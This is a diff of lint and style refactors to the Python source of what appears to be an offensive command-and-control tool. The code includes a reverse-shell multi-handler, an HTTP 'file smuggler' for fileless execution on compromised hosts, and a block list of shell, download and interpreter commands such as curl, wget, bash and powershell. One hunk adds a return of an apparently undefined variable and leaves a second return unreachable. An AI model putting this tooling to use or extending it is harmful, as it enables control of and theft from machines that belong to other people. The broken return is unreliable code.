 			del Sessions_Manager.shell_redirectors[session_id]
-		except:
+		except BaseException:  # noqa: BLE001, S110
 			pass
 
 
@@ -2476,7 +2467,7 @@ class TCP_Sock_Multi_Handler:
 				# Fallback case for unidentified OS or shell
 				return [False, False, False]
 
-		except Exception as e:
+		except Exception:  # noqa: BLE001
 			return [False, False, False]
 
 
@@ -2571,7 +2562,7 @@ class TCP_Sock_Multi_Handler:
 					hostname = [h for h in hostname_response if h.strip()]
 					hostname = ''.join(hostname)
 
-				except:
+				except BaseException:  # noqa: BLE001
 					hostname = 'Undefined'
 
 			else:
@@ -2579,12 +2570,12 @@ class TCP_Sock_Multi_Handler:
 				tmp = username.split('\\')
 				try: 
 					hostname = tmp[0].upper()
-				except: 
+				except BaseException:  # noqa: BLE001
 					hostname = 'Undefined'
 					
 				try: 
 					username = tmp[1].strip('\n\r\t >')
-				except: 
+				except BaseException:  # noqa: BLE001
 					username = 'Undefined'
 
 			# Create session object
@@ -2633,7 +2624,7 @@ class TCP_Sock_Multi_Handler:
 			# Start connection state monitor
 			Thread(target = self.is_still_connected, args = (session_id, conn), name = f'session_state_monitor_{address[0]}').start()
 
-		except Exception as e:
+		except Exception as e:  # noqa: BLE001
 			conn.close()
 			print_to_prompt(f'\r[{ERR}] Failed to establish a shell session: {e}.') if session_id not in Sessions_Manager.sessions_graveyard \
 			else do_nothing()
@@ -2651,11 +2642,11 @@ class TCP_Sock_Multi_Handler:
 		   	 
 				# If pseudo shell is active OR sibling server has pseudo shell active for this session
 				issuer = 'self' if session_id == Hoaxshell.active_shell else None
-				if session_id in Sessions_Manager.shell_redirectors.keys():
+				if session_id in Sessions_Manager.shell_redirectors:
 					issuer = Sessions_Manager.shell_redirectors[session_id]
 
 				if issuer:
-					self.recv_bulk(conn, quiet = False if Hoaxshell.active_shell else True, issuer = issuer, \
+					self.recv_bulk(conn, quiet = not Hoaxshell.active_shell, issuer = issuer, \
 					session_id = session_id, timeout = TCP_Sock_Handler_Settings.recv_timeout, echo = cmd_echo)
 
 				if Hoaxshell.command_pool[session_id]:
@@ -2686,7 +2677,7 @@ class TCP_Sock_Multi_Handler:
 						if self.is_socket_closed(conn):
 							raise ConnectionResetError
 						
-						conn.sendall('{}\n'.format(cmd).encode('utf-8'))
+						conn.sendall(f'{cmd}\n'.encode())
 				   	 
 						# Read response
 						self.recv_bulk(conn, quiet = quiet, session_id = session_id, echo = cmd_echo, issuer = issuer, \
@@ -2752,7 +2743,7 @@ class TCP_Sock_Multi_Handler:
 			except BlockingIOError:
 				break
 
-			except:
+			except BaseException:  # noqa: BLE001, S110
 				pass
 
 			finally:
@@ -2763,9 +2754,8 @@ class TCP_Sock_Multi_Handler:
 					user_issued_cmd = Sessions_Manager.active_sessions[session_id]['last_issued_cmd'].rstrip()
 
 					# Command echo filter
-					if echo and user_issued_cmd.strip():
-						if re.match('^' + re.escape(user_issued_cmd), output):
-							output = output[len(user_issued_cmd):]
+					if echo and user_issued_cmd.strip() and re.match('^' + re.escape(user_issued_cmd), output):
+						output = output[len(user_issued_cmd):]
 
 					if (issuer == 'self' and Hoaxshell.active_shell == session_id) or not quiet:
 						print(output, end='', flush=True)		
@@ -2773,7 +2763,6 @@ class TCP_Sock_Multi_Handler:
 						Core_Server.send_receive_one_encrypted(issuer, [output, '', session_id, False], 'command_output', 30) if output else do_nothing()
 				
 				Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()
-				return output 
 
 
 
@@ -2811,12 +2800,10 @@ class TCP_Sock_Multi_Handler:
 					begin = time()
 
 					# Strip command echo from response
-					if user_issued_cmd and not echoed_out:
-
-						if total_packets < 4 and re.match('^' + re.escape(user_issued_cmd), chunk):
+					if user_issued_cmd and not echoed_out and total_packets < 4 and re.match('^' + re.escape(user_issued_cmd), chunk):
 						#if total_packets < 4 and re.match(re.escape(user_issued_cmd), ''.join(response)):
-							echoed_out = True
-							chunk = chunk.replace(user_issued_cmd, '').lstrip('\n\r')
+						echoed_out = True
+						chunk = chunk.replace(user_issued_cmd, '').lstrip('\n\r')
 			   	 
 					# Output received data
 					if issuer == 'self':
@@ -2840,14 +2827,16 @@ class TCP_Sock_Multi_Handler:
 			except BlockingIOError:
 				pass
 
-			except:
+			except BaseException:  # noqa: BLE001, S110
 				pass
 		   	 
 		response = ''.join(response)
 		print('\n') if (not quiet and response.strip()) else do_nothing()
 
 		if issuer == 'self' and not quiet:
-			Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()
+				Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()
+
+		return output
 
 		return self.clean_nc_response(response)
 
@@ -2916,7 +2905,6 @@ class TCP_Sock_Multi_Handler:
 			sleep(TCP_Sock_Handler_Settings.alive_echo_exec_timeout)
 
 		Threading_params.thread_limiter.release()
-		return
 
 
 
@@ -2934,7 +2922,7 @@ class TCP_Sock_Multi_Handler:
 
 		elif shell_type in ['unix', 'zsh']:
 
-			zsh = True if shell_type == 'zsh' else False
+			_zsh = shell_type == 'zsh'
 			prompt_identified = False
 
 			# Search for prompt based on regex identifiers
@@ -2949,10 +2937,9 @@ class TCP_Sock_Multi_Handler:
 						prompt_identified = True
 						break
 
-			if not prompt_identified:
+			if not prompt_identified and re.search(self.prompt_regex_identifiers['zsh'], chunk):
 				# Check for zsh prompt in the raw chunk
-				if re.search(self.prompt_regex_identifiers['zsh'], chunk):
-					prompt_identified = True
+				prompt_identified = True
 
 			# Return last chunk and prompt value separated
 			if prompt_identified:
@@ -2966,7 +2953,7 @@ class TCP_Sock_Multi_Handler:
 							return [True, [sliced[0], sliced[-1]], shell_type]
 						else:
 							return [True, ['', sliced[0]], shell_type]
-					except Exception as e:
+					except Exception as e:  # noqa: BLE001
 						print(f'[{ERR}] search_chunk_for_sentinel_value failed: {e}')
 
 				elif shell_type == 'zsh':
@@ -2976,7 +2963,7 @@ class TCP_Sock_Multi_Handler:
 						prompt = ''.join(sliced[-2:])
 						data = ''.join(sliced[0:-2])
 						return [True, [data, prompt], shell_type]
-					except Exception as e:
+					except Exception:  # noqa: BLE001
 						return [True, ['', chunk], shell_type]
 
 		return [False]
@@ -3033,7 +3020,7 @@ class TCP_Sock_Multi_Handler:
 			sibling_server_id = re.findall("[\\S]{1,2}echo '{[a-zA-Z0-9]{32}}'", cmd)[-1]
 			sibling_server_id = sibling_server_id.split('echo ')[1].strip('{}\'')
 
-		except:
+		except BaseException:  # noqa: BLE001
 			sibling_server_id = None
 
 		return sibling_server_id
@@ -3066,7 +3053,7 @@ class TCP_Sock_Multi_Handler:
 		except ConnectionResetError:
 			return True
 
-		except:
+		except BaseException:  # noqa: BLE001
 			return False
 
 		return False
@@ -3076,11 +3063,11 @@ class TCP_Sock_Multi_Handler:
 class Session_Defender:
 
 	is_active = True
-	windows_dangerous_commands = ["powershell.exe", "powershell", "cmd.exe", "cmd", "curl", "wget", "telnet"]	
-	linux_dangerous_commands = ["bash", "sh", "zsh", "tclsh", "less", "more", "nano", "pico", "vi", "vim", \
+	windows_dangerous_commands: ClassVar[list] = ["powershell.exe", "powershell", "cmd.exe", "cmd", "curl", "wget", "telnet"]
+	linux_dangerous_commands: ClassVar[list] = ["bash", "sh", "zsh", "tclsh", "less", "more", "nano", "pico", "vi", "vim", \
 							 	"gedit", "atom", "emacs", "telnet"]
 	
-	interpreters = ['python', 'python3', 'php', 'ruby', 'irb', 'perl', 'jshell', 'node', 'ghci']
+	interpreters: ClassVar[list] = ['python', 'python3', 'php', 'ruby', 'irb', 'perl', 'jshell', 'node', 'ghci']
 
 
 	@staticmethod
@@ -3097,10 +3084,9 @@ class Session_Defender:
 			if cmd in (Session_Defender.windows_dangerous_commands + Session_Defender.interpreters):
 				return True
 
-		elif os == 'Linux':
-			if Session_Defender.ends_with_backslash(cmd) or any(cmd.lower().startswith(c) for c in (\
-				Session_Defender.linux_dangerous_commands + Session_Defender.interpreters)):
-				return True
+		elif os == 'Linux' and (Session_Defender.ends_with_backslash(cmd) or any(cmd.lower().startswith(c) for c in (\
+			Session_Defender.linux_dangerous_commands + Session_Defender.interpreters))):
+			return True
 
 		return False
 
@@ -3126,7 +3112,7 @@ class Session_Defender:
 
 	@staticmethod
 	def ends_with_backslash(cmd):
-		return True if cmd.endswith('\\') else False
+		return bool(cmd.endswith('\\'))
 
 
 
@@ -3173,7 +3159,7 @@ class Exec_Utils:
    	 
 		try:
 			return f'({cmd}); echo {base64.b64encode(Exec_Utils.sentinel_value.encode("utf-8")).decode("utf-8")} | base64 -d'
-		except:
+		except BaseException:  # noqa: BLE001
 			return cmd
 
 
@@ -3215,7 +3201,7 @@ class File_Smuggler_Http_Handler(BaseHTTPRequestHandler):
 
 			ticket = self.path.strip("/")
 
-			if ticket in File_Smuggler.file_transfer_tickets.keys():
+			if ticket in File_Smuggler.file_transfer_tickets:
 
 				data = File_Smuggler.file_transfer_tickets[ticket]['data']
 				issuer = File_Smuggler.file_transfer_tickets[ticket]['issuer']
@@ -3230,10 +3216,9 @@ class File_Smuggler_Http_Handler(BaseHTTPRequestHandler):
 				if File_Smuggler.file_transfer_tickets[ticket]['lifespan'] <= 0:
 					del File_Smuggler.file_transfer_tickets[ticket]
 
-		except:
+		except BaseException:  # noqa: BLE001
 			print(self.error_msg)
 			Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()
-			pass
 
 
 	def log_message(self, format, *args):
@@ -3244,9 +3229,9 @@ class File_Smuggler_Http_Handler(BaseHTTPRequestHandler):
 class File_Smuggler:
 
 	server_name = 'HTTP File Smuggler'
-	file_transfer_tickets = {}
+	file_transfer_tickets: ClassVar[dict] = {}
 
-	Utilities = {
+	Utilities: ClassVar[dict] = {
 		'fileless_exec' : {
 			'supported' : ['powershell.exe', 'unix', 'zsh', 'cmd.exe']
 		},
@@ -3261,10 +3246,10 @@ class File_Smuggler:
 			httpd = HTTPServer(('0.0.0.0', File_Smuggler_Settings.bind_port), File_Smuggler_Http_Handler)
 
 		except OSError:
-			exit(f'[{DEBUG}] {self.server_name} failed to start. Port {File_Smuggler_Settings.bind_address} seems to already be in use.\n')
+			sys.exit(f'[{DEBUG}] {self.server_name} failed to start. Port {File_Smuggler_Settings.bind_address} seems to already be in use.\n')
 
-		except:
-			exit(f'\n[{DEBUG}] {self.server_name} failed to start (Unknown error occurred).\n')
+		except BaseException:  # noqa: BLE001
+			sys.exit(f'\n[{DEBUG}] {self.server_name} failed to start (Unknown error occurred).\n')
 
 		http_file_smuggler_server = Thread(target = httpd.serve_forever, args = (), name = 'http_file_smuggler')
 		http_file_smuggler_server.daemon = True
@@ -3319,7 +3304,7 @@ class File_Smuggler:
 
 			Hoaxshell.command_pool[session_id].append(villain_cmd)
 
-		except:
+		except BaseException:  # noqa: BLE001
 			File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{ERR}] Upload function failed.')
 
 
@@ -3355,7 +3340,7 @@ class File_Smuggler:
 
 			Hoaxshell.command_pool[session_id].append(villain_cmd)
 
-		except Exception as e:
+		except Exception as e:  # noqa: BLE001
 			File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{ERR}] Fileless exec function failed: {e}')
 
 
